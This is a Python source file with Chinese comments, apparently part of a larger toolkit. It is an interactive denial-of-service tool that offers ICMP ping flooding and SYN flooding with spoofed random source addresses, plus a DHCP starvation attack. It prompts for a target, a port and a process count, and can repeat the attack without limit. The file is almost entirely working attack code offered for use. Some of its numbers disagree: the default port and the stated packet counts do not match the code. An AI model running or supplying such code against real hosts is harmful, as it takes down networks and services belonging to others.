#!/usr/bin/python
# -*- coding:utf-8

import time
import os,re,sys
from random import randint
import multiprocessing
import logging
logging.getLogger( "scapy.runtime" ).setLevel(logging.ERROR) #清除报错

sys.path.append('..')
from common.font import *
from common.pubOptimization import *
#防止高频调用导致堵塞，可对某些字段进行存储
Processing=str(Processing())
Information=str(Information())
Detected=str(Detected())
Result=str(Result())
Error=str(Error())

try:
    from scapy.all import *
except:
    print(Processing+'检测出您未安装random模块，将替您安装此模块，请稍候……')
    os.system('pip install scapy')
    from scapy.all import *


def random_ip():
    ip_part1 = randint(1, 255)
    ip_part2 = randint(1, 255)
    ip_part3 = randint(1, 255)
    ip_part4 = randint(1, 255)
    return str(ip_part1) + '.' + str(ip_part2) + '.' + str(ip_part3) + '.' + str(ip_part4)


def pingDos(data):
    host=data[0]
    pocesses=data[1]
    packetNum=0
    print('\n'+Processing+'模块已启动，开始Dos……\n')
    for i in range(1001):
        id_ip = randint(1, 65535)  # 随机产生IP ID位
        id_ping = randint(1, 65535)  # 随机产生ping ID位
        seq_ping = randint(1, 65535)  # 随机产生ping序列号位
        source_ip = random_ip()
        packet = IP(src=source_ip, dst=host, ttl=64, id=id_ip) / ICMP(id=id_ping, seq=seq_ping) / b'ping_Dos'*100
        ping = send(packet, verbose=False)
        packetNum=packetNum+1
        print("\r{0}已发送{1}个包".format(Information,pocesses*packetNum), end='')


def synDos(data): #定义方法，传入目标IP地址，目标端口号，是否激活随机伪装源IP地址
    ip=data[0]
    port=data[1]
    pocesses=data[2]
    packetNum=0
    print('\n'+Processing+'模块已启动，开始Dos……\n')
    for i in range(1001):
        source_port  =  random.randint( 1024 ,  65535 ) #随机产生源端口
        init_sn  =  random.randint( 1 ,  65535 * 63335 ) #随机产生初始化序列号
        source_ip = random_ip()
        #发送SYN同步包（不必等待回应）#随机伪装源IP，随机产生源端口和初始化序列号
        send(IP(src = source_ip,dst = ip) / TCP(dport = port,sport = source_port,flags = 2 ,seq = init_sn), verbose  =  False )
        packetNum=packetNum+1
        print("\r{0}已发送{1}个包".format(Information,pocesses*packetNum), end='')
		
def dhcpDos(data):
    iface=data[0]
    packetNum=0
    while 1:
        xidRandom = random.randint(1, 900000000)
        macRandom=str(RandMAC())
        dhcpDiscover = (Ether(src=macRandom,dst='ff:ff:ff:ff:ff:ff')/IP(src='0.0.0.0',dst='255.255.255.255')/UDP(sport=68,dport=67)/BOOTP(chaddr=macRandom,xid=xidRandom,flags=0x8000)/DHCP(options=[('message-type','discover')]))
        sendp(dhcpDiscover,iface=iface)
        packetNum=packetNum+1
        print("\r{0}已发送{1}个IP请求包".format(Information,packetNum), end='')


def initDos(data, pocesses,everDos,choseModule):
    isEverDos=1
    if choseModule==1:
        funcDos=pingDos
    elif choseModule==2:
        funcDos=synDos
    elif choseModule==3:
        funcDos=dhcpDos
    pool = multiprocessing.Pool(pocesses)
    while isEverDos:#无限制跑
        if everDos=='0':#关闭无限制跑
            isEverDos=0
        try:
            pool.apply_async(funcDos,(data,)).wait()
        except KeyboardInterrupt:
            pool.terminate()


if __name__ == '__main__':
    #配置
    isHost=1
    p = re.compile('^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$')

    #获取外部传入choseModule
    if len(sys.argv)==2:
        choseModule=int(sys.argv[1])
    else:
        choseModule=0
    if choseModule==0:
        print(bold('\n请选择使用的Dos模块序号：\n'+"""\033[1m 
1. pingDos	2.synDos	3.dhcpDos(本地) \033[0m"""))
        try:
            choseModule=int(input("\n"+Input()))
        except:
            print(+Error+'输入格式错误，默认选择pinDos……\n')
            choseModule=1
    while isHost and choseModule!=3:
        Host=input('\n'+bold('请输入PingDos的IP：		（例：127.0.0.1）\n\n')+Input())
        if p.match(Host):
            isHost=0
        else:
            print('\n'+Error+'IP格式错误，请重新输入……\n')
    if choseModule==2:#synDos
        try:
            port=int(input(bold('\n请输入端口号：		（默认：80）\n\n')+Input()))
        except:
            print('\n'+Error+'输入格式错误，自动选择默认端口80！\n')
            port=10
        data=(Host,port)
    elif choseModule==3:#dhcpDos
        iface=input('\n'+bold('请输入当前网卡名称：		（例：eth0）\n\n')+Input())
        pocesses=1
        everDos='n'
        data=(iface,)
    elif choseModule==1:#pingDos
        data=(Host,)
    if choseModule!=3:
        try:
            pocesses=int(input(bold('\n请输入线程数：		（注：每个线程将发送10000个包。【默认60线程】）\n\n')+Input()))
        except:
            print('\n'+Error+'输入格式错误，自动选择默认60线程！\n')
            pocesses=60
        everDos=input('\n'+bold('是否无限制Dos：		（ Y/N	【默认N】）\n\n')+Input())
    data=data+(pocesses,)
    if everDos.lower()=='y':
        everDos='1'
    else:
        everDos='0'
    
    #初始化模块
    print('\n'+Processing+'初始化模块，正在创建%d个进程……\n'%pocesses)
    initDos(data, pocesses,everDos,choseModule)
    print('\n'+Result+'Dos攻击已结束,共计'+str(pocesses*10000)+'次！\n')